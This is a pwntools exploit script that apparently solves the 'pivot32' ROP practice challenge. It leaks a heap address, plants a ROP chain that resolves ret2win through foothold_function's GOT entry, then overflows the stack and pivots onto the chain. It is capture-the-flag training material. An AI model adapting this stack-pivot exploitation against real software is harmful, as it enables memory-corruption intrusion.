#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./pivot32")
sh = process("./pivot32")

foothold_function_plt = elf.plt["foothold_function"]
foothold_function_got = elf.got["foothold_function"]
ret2win_off = 503
mov_eax_eax = 0x080488c4
pop_eax = 0x080488c0
pop_ebx = 0x08048571
add_eax_ebx = 0x080488C7
call_eax = 0x080486A3
xchg_eax_esp = 0x080488c2

sh.recvuntil("pivot: ")
recv = sh.recvuntil("\n")
heap_addr = int(recv,16)

payload = ""
payload += p32(foothold_function_plt)
payload += p32(pop_eax)
payload += p32(foothold_function_got)
payload += p32(mov_eax_eax)
payload += p32(pop_ebx)
payload += p32(ret2win_off)
payload += p32(add_eax_ebx)
payload += p32(call_eax)

sh.recvuntil("> ")
sh.sendline(payload)

payload = ""
payload += "A"*44
payload += p32(pop_eax)
payload += p32(heap_addr)
payload += p32(xchg_eax_esp)

sh.recvuntil("> ")
sh.sendline(payload)

sh.interactive()